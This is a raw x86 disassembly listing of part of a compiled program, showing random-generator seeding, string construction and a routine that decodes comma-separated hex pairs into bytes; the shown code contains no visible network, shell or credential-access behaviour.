  4017d8:	c7 05 e0 ee 4a 00 01 	movl   $0x1,0x4aeee0
  4017df:	00 00 00 
  4017e2:	c7 05 d0 c5 4a 00 d8 	movl   $0x4aeed8,0x4ac5d0
  4017e9:	ee 4a 00 
  4017ec:	c7 05 58 d9 4a 00 ff 	movl   $0xffffffff,0x4ad958
  4017f3:	ff ff ff 
  4017f6:	c7 05 d8 c5 4a 00 71 	movl   $0x1571,0x4ac5d8
  4017fd:	15 00 00 
  401800:	b9 71 15 00 00       	mov    $0x1571,%ecx
  401805:	b8 91 fd ff ff       	mov    $0xfffffd91,%eax
  40180a:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  401811:	1f 84 00 00 00 00 00 
  401818:	89 ca                	mov    %ecx,%edx
  40181a:	c1 ea 1e             	shr    $0x1e,%edx
  40181d:	31 ca                	xor    %ecx,%edx
  40181f:	69 ca 65 89 07 6c    	imul   $0x6c078965,%edx,%ecx
  401825:	8d 8c 08 70 02 00 00 	lea    0x270(%eax,%ecx,1),%ecx
  40182c:	89 0c 85 98 cf 4a 00 	mov    %ecx,0x4acf98(,%eax,4)
  401833:	40                   	inc    %eax
  401834:	75 e2                	jne    0x401818
  401836:	c7 05 d4 c5 4a 00 70 	movl   $0x270,0x4ac5d4
  40183d:	02 00 00 
  401840:	c7 85 68 ff ff ff ff 	movl   $0xffffffff,-0x98(%ebp)
  401847:	ff ff ff 
  40184a:	c7 04 24 5c d9 4a 00 	movl   $0x4ad95c,(%esp)
  401851:	e8 26 54 00 00       	call   0x406c7c
  401856:	c7 04 24 78 12 40 00 	movl   $0x401278,(%esp)
  40185d:	e8 fe bc 01 00       	call   0x41d560
  401862:	c7 85 68 ff ff ff ff 	movl   $0xffffffff,-0x98(%ebp)
  401869:	ff ff ff 
  40186c:	c7 04 24 5d d9 4a 00 	movl   $0x4ad95d,(%esp)
  401873:	e8 4c 9d 00 00       	call   0x40b5c4
  401878:	c7 04 24 98 12 40 00 	movl   $0x401298,(%esp)
  40187f:	e8 dc bc 01 00       	call   0x41d560
  401884:	c7 45 d4 0f 00 00 00 	movl   $0xf,-0x2c(%ebp)
  40188b:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  401892:	c6 45 c0 00          	movb   $0x0,-0x40(%ebp)
  401896:	c7 85 68 ff ff ff ff 	movl   $0xffffffff,-0x98(%ebp)
  40189d:	ff ff ff 
  4018a0:	8d 75 bc             	lea    -0x44(%ebp),%esi
  4018a3:	89 34 24             	mov    %esi,(%esp)
  4018a6:	c7 44 24 04 8c 33 42 	movl   $0x42338c,0x4(%esp)
  4018ad:	00 
  4018ae:	e8 d1 33 00 00       	call   0x404c84
  4018b3:	c7 85 68 ff ff ff 01 	movl   $0x1,-0x98(%ebp)
  4018ba:	00 00 00 
  4018bd:	89 74 24 04          	mov    %esi,0x4(%esp)
  4018c1:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4018c4:	89 04 24             	mov    %eax,(%esp)
  4018c7:	e8 2c 04 00 00       	call   0x401cf8
  4018cc:	83 7d f0 0f          	cmpl   $0xf,-0x10(%ebp)
  4018d0:	77 05                	ja     0x4018d7
  4018d2:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4018d5:	eb 03                	jmp    0x4018da
  4018d7:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4018da:	c7 85 68 ff ff ff 02 	movl   $0x2,-0x98(%ebp)
  4018e1:	00 00 00 
  4018e4:	89 04 24             	mov    %eax,(%esp)
  4018e7:	e8 28 09 02 00       	call   0x422214
  4018ec:	83 ec 04             	sub    $0x4,%esp
  4018ef:	89 c6                	mov    %eax,%esi
  4018f1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4018f4:	83 f9 10             	cmp    $0x10,%ecx
  4018f7:	72 17                	jb     0x401910
  4018f9:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4018fc:	41                   	inc    %ecx
  4018fd:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401903:	72 03                	jb     0x401908
  401905:	8b 40 fc             	mov    -0x4(%eax),%eax
  401908:	89 04 24             	mov    %eax,(%esp)
  40190b:	e8 1c 4b 00 00       	call   0x40642c
  401910:	c7 45 f0 0f 00 00 00 	movl   $0xf,-0x10(%ebp)
  401917:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  40191e:	c6 45 dc 00          	movb   $0x0,-0x24(%ebp)
  401922:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401925:	83 f9 10             	cmp    $0x10,%ecx
  401928:	72 17                	jb     0x401941
  40192a:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40192d:	41                   	inc    %ecx
  40192e:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401934:	72 03                	jb     0x401939
  401936:	8b 40 fc             	mov    -0x4(%eax),%eax
  401939:	89 04 24             	mov    %eax,(%esp)
  40193c:	e8 eb 4a 00 00       	call   0x40642c
  401941:	89 35 6c ee 4a 00    	mov    %esi,0x4aee6c
  401947:	c7 45 d4 0f 00 00 00 	movl   $0xf,-0x2c(%ebp)
  40194e:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  401955:	c6 45 c0 00          	movb   $0x0,-0x40(%ebp)
  401959:	c7 85 68 ff ff ff ff 	movl   $0xffffffff,-0x98(%ebp)
  401960:	ff ff ff 
  401963:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401966:	89 c6                	mov    %eax,%esi
  401968:	89 34 24             	mov    %esi,(%esp)
  40196b:	c7 44 24 04 b1 33 42 	movl   $0x4233b1,0x4(%esp)
  401972:	00 
  401973:	e8 0c 33 00 00       	call   0x404c84
  401978:	c7 85 68 ff ff ff 03 	movl   $0x3,-0x98(%ebp)
  40197f:	00 00 00 
  401982:	89 74 24 04          	mov    %esi,0x4(%esp)
  401986:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401989:	89 04 24             	mov    %eax,(%esp)
  40198c:	e8 67 03 00 00       	call   0x401cf8
  401991:	83 7d f0 0f          	cmpl   $0xf,-0x10(%ebp)
  401995:	77 05                	ja     0x40199c
  401997:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40199a:	eb 03                	jmp    0x40199f
  40199c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40199f:	c7 85 68 ff ff ff 04 	movl   $0x4,-0x98(%ebp)
  4019a6:	00 00 00 
  4019a9:	89 04 24             	mov    %eax,(%esp)
  4019ac:	e8 2b 07 00 00       	call   0x4020dc
  4019b1:	89 c6                	mov    %eax,%esi
  4019b3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4019b6:	83 f9 10             	cmp    $0x10,%ecx
  4019b9:	72 17                	jb     0x4019d2
  4019bb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4019be:	41                   	inc    %ecx
  4019bf:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4019c5:	72 03                	jb     0x4019ca
  4019c7:	8b 40 fc             	mov    -0x4(%eax),%eax
  4019ca:	89 04 24             	mov    %eax,(%esp)
  4019cd:	e8 5a 4a 00 00       	call   0x40642c
  4019d2:	c7 45 f0 0f 00 00 00 	movl   $0xf,-0x10(%ebp)
  4019d9:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4019e0:	c6 45 dc 00          	movb   $0x0,-0x24(%ebp)
  4019e4:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4019e7:	83 f9 10             	cmp    $0x10,%ecx
  4019ea:	72 17                	jb     0x401a03
  4019ec:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4019ef:	41                   	inc    %ecx
  4019f0:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4019f6:	72 03                	jb     0x4019fb
  4019f8:	8b 40 fc             	mov    -0x4(%eax),%eax
  4019fb:	89 04 24             	mov    %eax,(%esp)
  4019fe:	e8 29 4a 00 00       	call   0x40642c
  401a03:	89 35 70 ee 4a 00    	mov    %esi,0x4aee70
  401a09:	c7 45 d4 0f 00 00 00 	movl   $0xf,-0x2c(%ebp)
  401a10:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  401a17:	c6 45 c0 00          	movb   $0x0,-0x40(%ebp)
  401a1b:	c7 85 68 ff ff ff ff 	movl   $0xffffffff,-0x98(%ebp)
  401a22:	ff ff ff 
  401a25:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401a28:	89 c6                	mov    %eax,%esi
  401a2a:	89 34 24             	mov    %esi,(%esp)
  401a2d:	c7 44 24 04 cd 33 42 	movl   $0x4233cd,0x4(%esp)
  401a34:	00 
  401a35:	e8 4a 32 00 00       	call   0x404c84
  401a3a:	c7 85 68 ff ff ff 05 	movl   $0x5,-0x98(%ebp)
  401a41:	00 00 00 
  401a44:	89 74 24 04          	mov    %esi,0x4(%esp)
  401a48:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401a4b:	89 04 24             	mov    %eax,(%esp)
  401a4e:	e8 a5 02 00 00       	call   0x401cf8
  401a53:	83 7d f0 0f          	cmpl   $0xf,-0x10(%ebp)
  401a57:	77 05                	ja     0x401a5e
  401a59:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401a5c:	eb 03                	jmp    0x401a61
  401a5e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401a61:	c7 85 68 ff ff ff 06 	movl   $0x6,-0x98(%ebp)
  401a68:	00 00 00 
  401a6b:	89 04 24             	mov    %eax,(%esp)
  401a6e:	e8 a1 07 02 00       	call   0x422214
  401a73:	83 ec 04             	sub    $0x4,%esp
  401a76:	89 c6                	mov    %eax,%esi
  401a78:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401a7b:	83 f9 10             	cmp    $0x10,%ecx
  401a7e:	72 17                	jb     0x401a97
  401a80:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401a83:	41                   	inc    %ecx
  401a84:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401a8a:	72 03                	jb     0x401a8f
  401a8c:	8b 40 fc             	mov    -0x4(%eax),%eax
  401a8f:	89 04 24             	mov    %eax,(%esp)
  401a92:	e8 95 49 00 00       	call   0x40642c
  401a97:	c7 45 f0 0f 00 00 00 	movl   $0xf,-0x10(%ebp)
  401a9e:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  401aa5:	c6 45 dc 00          	movb   $0x0,-0x24(%ebp)
  401aa9:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401aac:	83 f9 10             	cmp    $0x10,%ecx
  401aaf:	72 17                	jb     0x401ac8
  401ab1:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401ab4:	41                   	inc    %ecx
  401ab5:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401abb:	72 03                	jb     0x401ac0
  401abd:	8b 40 fc             	mov    -0x4(%eax),%eax
  401ac0:	89 04 24             	mov    %eax,(%esp)
  401ac3:	e8 64 49 00 00       	call   0x40642c
  401ac8:	89 35 74 ee 4a 00    	mov    %esi,0x4aee74
  401ace:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  401ad4:	89 04 24             	mov    %eax,(%esp)
  401ad7:	e8 46 05 02 00       	call   0x422022
  401adc:	81 c4 bc 00 00 00    	add    $0xbc,%esp
  401ae2:	5e                   	pop    %esi
  401ae3:	5f                   	pop    %edi
  401ae4:	5b                   	pop    %ebx
  401ae5:	5d                   	pop    %ebp
  401ae6:	c3                   	ret
  401ae7:	8b 85 64 ff ff ff    	mov    -0x9c(%ebp),%eax
  401aed:	3d 06 00 00 00       	cmp    $0x6,%eax
  401af2:	76 02                	jbe    0x401af6
  401af4:	0f 0b                	ud2
  401af6:	2d 01 00 00 00       	sub    $0x1,%eax
  401afb:	ff 24 85 e0 1c 40 00 	jmp    *0x401ce0(,%eax,4)
  401b02:	8b b5 6c ff ff ff    	mov    -0x94(%ebp),%esi
  401b08:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  401b0e:	eb 45                	jmp    0x401b55
  401b10:	8b b5 6c ff ff ff    	mov    -0x94(%ebp),%esi
  401b16:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  401b1c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401b1f:	83 f8 10             	cmp    $0x10,%eax
  401b22:	72 1f                	jb     0x401b43
  401b24:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401b27:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  401b2a:	40                   	inc    %eax
  401b2b:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401b30:	8b 45 b8             	mov    -0x48(%ebp),%eax
  401b33:	72 06                	jb     0x401b3b
  401b35:	8b 45 b8             	mov    -0x48(%ebp),%eax
  401b38:	8b 40 fc             	mov    -0x4(%eax),%eax
  401b3b:	89 04 24             	mov    %eax,(%esp)
  401b3e:	e8 e9 48 00 00       	call   0x40642c
  401b43:	c7 45 f0 0f 00 00 00 	movl   $0xf,-0x10(%ebp)
  401b4a:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  401b51:	c6 45 dc 00          	movb   $0x0,-0x24(%ebp)
  401b55:	89 bd 50 ff ff ff    	mov    %edi,-0xb0(%ebp)
  401b5b:	89 b5 5c ff ff ff    	mov    %esi,-0xa4(%ebp)
  401b61:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401b64:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  401b67:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  401b6a:	83 f8 10             	cmp    $0x10,%eax
  401b6d:	72 22                	jb     0x401b91
  401b6f:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401b72:	89 45 b0             	mov    %eax,-0x50(%ebp)
  401b75:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  401b78:	40                   	inc    %eax
  401b79:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401b7e:	8b 45 b0             	mov    -0x50(%ebp),%eax
  401b81:	72 06                	jb     0x401b89
  401b83:	8b 45 b0             	mov    -0x50(%ebp),%eax
  401b86:	8b 40 fc             	mov    -0x4(%eax),%eax
  401b89:	89 04 24             	mov    %eax,(%esp)
  401b8c:	e8 9b 48 00 00       	call   0x40642c
  401b91:	8b 85 5c ff ff ff    	mov    -0xa4(%ebp),%eax
  401b97:	e9 2f 01 00 00       	jmp    0x401ccb
  401b9c:	8b b5 6c ff ff ff    	mov    -0x94(%ebp),%esi
  401ba2:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  401ba8:	eb 45                	jmp    0x401bef
  401baa:	8b b5 6c ff ff ff    	mov    -0x94(%ebp),%esi
  401bb0:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  401bb6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401bb9:	83 f8 10             	cmp    $0x10,%eax
  401bbc:	72 1f                	jb     0x401bdd
  401bbe:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401bc1:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  401bc4:	40                   	inc    %eax
  401bc5:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401bca:	8b 45 ac             	mov    -0x54(%ebp),%eax
  401bcd:	72 06                	jb     0x401bd5
  401bcf:	8b 45 ac             	mov    -0x54(%ebp),%eax
  401bd2:	8b 40 fc             	mov    -0x4(%eax),%eax
  401bd5:	89 04 24             	mov    %eax,(%esp)
  401bd8:	e8 4f 48 00 00       	call   0x40642c
  401bdd:	c7 45 f0 0f 00 00 00 	movl   $0xf,-0x10(%ebp)
  401be4:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  401beb:	c6 45 dc 00          	movb   $0x0,-0x24(%ebp)
  401bef:	89 bd 4c ff ff ff    	mov    %edi,-0xb4(%ebp)
  401bf5:	89 b5 58 ff ff ff    	mov    %esi,-0xa8(%ebp)
  401bfb:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401bfe:	89 45 a8             	mov    %eax,-0x58(%ebp)
  401c01:	8b 45 a8             	mov    -0x58(%ebp),%eax
  401c04:	83 f8 10             	cmp    $0x10,%eax
  401c07:	72 22                	jb     0x401c2b
  401c09:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401c0c:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  401c0f:	8b 45 a8             	mov    -0x58(%ebp),%eax
  401c12:	40                   	inc    %eax
  401c13:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401c18:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  401c1b:	72 06                	jb     0x401c23
  401c1d:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  401c20:	8b 40 fc             	mov    -0x4(%eax),%eax
  401c23:	89 04 24             	mov    %eax,(%esp)
  401c26:	e8 01 48 00 00       	call   0x40642c
  401c2b:	8b 85 58 ff ff ff    	mov    -0xa8(%ebp),%eax
  401c31:	e9 95 00 00 00       	jmp    0x401ccb
  401c36:	8b b5 6c ff ff ff    	mov    -0x94(%ebp),%esi
  401c3c:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  401c42:	eb 45                	jmp    0x401c89
  401c44:	8b b5 6c ff ff ff    	mov    -0x94(%ebp),%esi
  401c4a:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  401c50:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401c53:	83 f8 10             	cmp    $0x10,%eax
  401c56:	72 1f                	jb     0x401c77
  401c58:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401c5b:	89 4d a0             	mov    %ecx,-0x60(%ebp)
  401c5e:	40                   	inc    %eax
  401c5f:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401c64:	8b 45 a0             	mov    -0x60(%ebp),%eax
  401c67:	72 06                	jb     0x401c6f
  401c69:	8b 45 a0             	mov    -0x60(%ebp),%eax
  401c6c:	8b 40 fc             	mov    -0x4(%eax),%eax
  401c6f:	89 04 24             	mov    %eax,(%esp)
  401c72:	e8 b5 47 00 00       	call   0x40642c
  401c77:	c7 45 f0 0f 00 00 00 	movl   $0xf,-0x10(%ebp)
  401c7e:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  401c85:	c6 45 dc 00          	movb   $0x0,-0x24(%ebp)
  401c89:	89 bd 48 ff ff ff    	mov    %edi,-0xb8(%ebp)
  401c8f:	89 b5 54 ff ff ff    	mov    %esi,-0xac(%ebp)
  401c95:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401c98:	89 45 9c             	mov    %eax,-0x64(%ebp)
  401c9b:	8b 45 9c             	mov    -0x64(%ebp),%eax
  401c9e:	83 f8 10             	cmp    $0x10,%eax
  401ca1:	72 22                	jb     0x401cc5
  401ca3:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401ca6:	89 45 98             	mov    %eax,-0x68(%ebp)
  401ca9:	8b 45 9c             	mov    -0x64(%ebp),%eax
  401cac:	40                   	inc    %eax
  401cad:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401cb2:	8b 45 98             	mov    -0x68(%ebp),%eax
  401cb5:	72 06                	jb     0x401cbd
  401cb7:	8b 45 98             	mov    -0x68(%ebp),%eax
  401cba:	8b 40 fc             	mov    -0x4(%eax),%eax
  401cbd:	89 04 24             	mov    %eax,(%esp)
  401cc0:	e8 67 47 00 00       	call   0x40642c
  401cc5:	8b 85 54 ff ff ff    	mov    -0xac(%ebp),%eax
  401ccb:	c7 85 68 ff ff ff ff 	movl   $0xffffffff,-0x98(%ebp)
  401cd2:	ff ff ff 
  401cd5:	89 04 24             	mov    %eax,(%esp)
  401cd8:	e8 c3 02 02 00       	call   0x421fa0
  401cdd:	83 ec 04             	sub    $0x4,%esp
  401ce0:	02 1b                	add    (%ebx),%bl
  401ce2:	40                   	inc    %eax
  401ce3:	00 10                	add    %dl,(%eax)
  401ce5:	1b 40 00             	sbb    0x0(%eax),%eax
  401ce8:	9c                   	pushf
  401ce9:	1b 40 00             	sbb    0x0(%eax),%eax
  401cec:	aa                   	stos   %al,%es:(%edi)
  401ced:	1b 40 00             	sbb    0x0(%eax),%eax
  401cf0:	36 1c 40             	ss sbb $0x40,%al
  401cf3:	00 44 1c 40          	add    %al,0x40(%esp,%ebx,1)
  401cf7:	00 55 89             	add    %dl,-0x77(%ebp)
  401cfa:	e5 53                	in     $0x53,%eax
  401cfc:	57                   	push   %edi
  401cfd:	56                   	push   %esi
  401cfe:	81 ec ac 00 00 00    	sub    $0xac,%esp
  401d04:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401d07:	83 ec 0c             	sub    $0xc,%esp
  401d0a:	6a 10                	push   $0x10
  401d0c:	e8 13 94 00 00       	call   0x40b124
  401d11:	83 c4 10             	add    $0x10,%esp
  401d14:	c7 40 0c 34 67 00 00 	movl   $0x6734,0xc(%eax)
  401d1b:	c7 40 08 72 68 74 6a 	movl   $0x6a746872,0x8(%eax)
  401d22:	c7 40 04 66 77 65 34 	movl   $0x34657766,0x4(%eax)
  401d29:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401d2c:	c7 00 66 67 64 68    	movl   $0x68646766,(%eax)
  401d32:	c7 45 e8 0f 00 00 00 	movl   $0xf,-0x18(%ebp)
  401d39:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  401d40:	c6 45 d4 00          	movb   $0x0,-0x2c(%ebp)
  401d44:	8b 77 14             	mov    0x14(%edi),%esi
  401d47:	c7 85 74 ff ff ff 98 	movl   $0x421398,-0x8c(%ebp)
  401d4e:	13 42 00 
  401d51:	c7 85 78 ff ff ff 58 	movl   $0x423558,-0x88(%ebp)
  401d58:	35 42 00 
  401d5b:	89 ad 7c ff ff ff    	mov    %ebp,-0x84(%ebp)
  401d61:	89 65 84             	mov    %esp,-0x7c(%ebp)
  401d64:	c7 85 7c ff ff ff f9 	movl   $0x401ff9,-0x84(%ebp)
  401d6b:	1f 40 00 
  401d6e:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  401d74:	e8 88 02 02 00       	call   0x422001
  401d79:	85 f6                	test   %esi,%esi
  401d7b:	0f 84 79 01 00 00    	je     0x401efa
  401d81:	8d 47 04             	lea    0x4(%edi),%eax
  401d84:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401d87:	31 c9                	xor    %ecx,%ecx
  401d89:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  401d90:	0f 1f 84 00 00 00 00 
  401d97:	00 
  401d98:	83 7f 18 0f          	cmpl   $0xf,0x18(%edi)
  401d9c:	77 1a                	ja     0x401db8
  401d9e:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401da1:	80 3c 08 2c          	cmpb   $0x2c,(%eax,%ecx,1)
  401da5:	74 1e                	je     0x401dc5
  401da7:	e9 45 01 00 00       	jmp    0x401ef1
  401dac:	66 66 66 2e 0f 1f 84 	data16 data16 nopw %cs:0x0(%eax,%eax,1)
  401db3:	00 00 00 00 00 
  401db8:	8b 47 04             	mov    0x4(%edi),%eax
  401dbb:	80 3c 08 2c          	cmpb   $0x2c,(%eax,%ecx,1)
  401dbf:	0f 85 2c 01 00 00    	jne    0x401ef1
  401dc5:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  401dc8:	8d 41 fe             	lea    -0x2(%ecx),%eax
  401dcb:	c7 45 b0 0f 00 00 00 	movl   $0xf,-0x50(%ebp)
  401dd2:	c7 45 ac 00 00 00 00 	movl   $0x0,-0x54(%ebp)
  401dd9:	c6 45 9c 00          	movb   $0x0,-0x64(%ebp)
  401ddd:	c7 85 60 ff ff ff 02 	movl   $0x2,-0xa0(%ebp)
  401de4:	00 00 00 
  401de7:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  401dea:	6a 02                	push   $0x2
  401dec:	50                   	push   %eax
  401ded:	57                   	push   %edi
  401dee:	51                   	push   %ecx
  401def:	e8 e8 28 00 00       	call   0x4046dc
  401df4:	83 c4 10             	add    $0x10,%esp
  401df7:	83 7d b0 0f          	cmpl   $0xf,-0x50(%ebp)
  401dfb:	77 0b                	ja     0x401e08
  401dfd:	8d 45 9c             	lea    -0x64(%ebp),%eax
  401e00:	eb 09                	jmp    0x401e0b
  401e02:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  401e08:	8b 45 9c             	mov    -0x64(%ebp),%eax
  401e0b:	c7 85 60 ff ff ff 03 	movl   $0x3,-0xa0(%ebp)
  401e12:	00 00 00 
  401e15:	83 ec 04             	sub    $0x4,%esp
  401e18:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  401e1b:	51                   	push   %ecx
  401e1c:	68 db 30 42 00       	push   $0x4230db
  401e21:	50                   	push   %eax
  401e22:	e8 49 2f 01 00       	call   0x414d70
  401e27:	83 c4 10             	add    $0x10,%esp
  401e2a:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  401e2d:	83 f9 10             	cmp    $0x10,%ecx
  401e30:	72 1b                	jb     0x401e4d
  401e32:	8b 45 9c             	mov    -0x64(%ebp),%eax
  401e35:	41                   	inc    %ecx
  401e36:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401e3c:	72 03                	jb     0x401e41
  401e3e:	8b 40 fc             	mov    -0x4(%eax),%eax
  401e41:	83 ec 0c             	sub    $0xc,%esp
  401e44:	50                   	push   %eax
  401e45:	e8 e2 45 00 00       	call   0x40642c
  401e4a:	83 c4 10             	add    $0x10,%esp
  401e4d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401e50:	83 f8 fe             	cmp    $0xfffffffe,%eax
  401e53:	0f 83 86 01 00 00    	jae    0x401fdf
  401e59:	0f b6 4d 94          	movzbl -0x6c(%ebp),%ecx
  401e5d:	88 4d f3             	mov    %cl,-0xd(%ebp)
  401e60:	89 45 b8             	mov    %eax,-0x48(%ebp)
  401e63:	8d 48 01             	lea    0x1(%eax),%ecx
  401e66:	c7 85 60 ff ff ff 05 	movl   $0x5,-0xa0(%ebp)
  401e6d:	00 00 00 
  401e70:	83 ec 04             	sub    $0x4,%esp
  401e73:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401e76:	6a 00                	push   $0x0
  401e78:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  401e7b:	51                   	push   %ecx
  401e7c:	50                   	push   %eax
  401e7d:	e8 9e 29 00 00       	call   0x404820
  401e82:	83 c4 10             	add    $0x10,%esp
  401e85:	84 c0                	test   %al,%al
  401e87:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401e8a:	74 5e                	je     0x401eea
  401e8c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401e8f:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401e92:	8b 75 b8             	mov    -0x48(%ebp),%esi
  401e95:	29 f0                	sub    %esi,%eax
  401e97:	74 24                	je     0x401ebd
  401e99:	83 f9 0f             	cmp    $0xf,%ecx
  401e9c:	77 05                	ja     0x401ea3
  401e9e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  401ea1:	eb 03                	jmp    0x401ea6
  401ea3:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401ea6:	8d 54 31 01          	lea    0x1(%ecx,%esi,1),%edx
  401eaa:	01 f1                	add    %esi,%ecx
  401eac:	83 ec 04             	sub    $0x4,%esp
  401eaf:	50                   	push   %eax
  401eb0:	51                   	push   %ecx
  401eb1:	52                   	push   %edx
  401eb2:	e8 7e 02 01 00       	call   0x412135
  401eb7:	83 c4 10             	add    $0x10,%esp
  401eba:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401ebd:	83 f9 0f             	cmp    $0xf,%ecx
  401ec0:	77 05                	ja     0x401ec7
  401ec2:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  401ec5:	eb 03                	jmp    0x401eca
  401ec7:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401eca:	0f b6 4d f3          	movzbl -0xd(%ebp),%ecx
  401ece:	88 0c 30             	mov    %cl,(%eax,%esi,1)
  401ed1:	83 7d e8 0f          	cmpl   $0xf,-0x18(%ebp)
  401ed5:	77 05                	ja     0x401edc
  401ed7:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  401eda:	eb 03                	jmp    0x401edf
  401edc:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401edf:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  401ee2:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  401ee5:	c6 44 30 01 00       	movb   $0x0,0x1(%eax,%esi,1)
  401eea:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  401eed:	41                   	inc    %ecx
  401eee:	8b 77 14             	mov    0x14(%edi),%esi
  401ef1:	41                   	inc    %ecx
  401ef2:	39 f1                	cmp    %esi,%ecx
  401ef4:	0f 82 9e fe ff ff    	jb     0x401d98
  401efa:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401efd:	c7 41 18 0f 00 00 00 	movl   $0xf,0x18(%ecx)
  401f04:	c7 41 14 00 00 00 00 	movl   $0x0,0x14(%ecx)
  401f0b:	c6 41 04 00          	movb   $0x0,0x4(%ecx)
  401f0f:	c7 85 60 ff ff ff 01 	movl   $0x1,-0xa0(%ebp)
  401f16:	00 00 00 
  401f19:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401f1c:	6a ff                	push   $0xffffffff
  401f1e:	6a 00                	push   $0x0
  401f20:	50                   	push   %eax
  401f21:	51                   	push   %ecx
  401f22:	e8 b5 27 00 00       	call   0x4046dc
  401f27:	83 c4 10             	add    $0x10,%esp
  401f2a:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  401f2e:	74 58                	je     0x401f88
